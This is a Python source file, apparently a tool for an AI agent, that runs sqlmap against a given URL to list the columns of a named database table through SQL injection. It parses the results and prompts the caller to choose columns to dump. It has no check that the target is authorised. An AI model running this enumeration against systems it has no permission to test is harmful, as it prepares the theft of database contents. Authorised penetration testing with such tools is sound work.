import re
import subprocess
from config import SQLMAP_PATH
from tools._clean_identifier import _clean_identifier
from tools.is_not_injectable import _is_not_injectable


def run_sqlmap_get_column(url: str, database: str, table: str) -> str:
    if 'http' not in url.lower():
        return "URL格式错误"

    cmd = [
        "python", SQLMAP_PATH,
        "-u", url,
        "-D", database,
        "-T", table,
        "--columns",
        "--batch",
        "--timeout", "10",
        "-v", "0"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        if result.returncode != 0:
            return f"SQLMap 失败: {result.stderr.strip()[:500]}"
        output = result.stdout.strip()
        if not output or _is_not_injectable(output):
            return f"未检测到注入点，输出:\n{output[:500]}"

        columns = []
        # 策略1: 匹配 resumed: 'column_name'
        columns = re.findall(r"resumed:\s+'([^']+)'", output, re.IGNORECASE)
        if not columns:
            in_table_section = False
            for line in output.split('\n'):
                if re.search(r'Table: \w+', line, re.IGNORECASE):
                    in_table_section = True
                    continue
                if in_table_section and '|' in line and not line.strip().startswith('+'):
                    parts = [p.strip() for p in line.split('|') if p.strip()]
                    if parts:
                        col_candidate = parts[0]
                        if _clean_identifier(col_candidate) and col_candidate.lower() != 'column':
                            columns.append(col_candidate)
        columns = list(dict.fromkeys(columns))
        if columns:
            return f"表 {table} 中的列: {', '.join(columns)}。请选择要dump的列。"
        else:
            return f"未找到列。输出片段:\n{output[:800]}"
    except Exception as e:
        return f"错误: {str(e)}"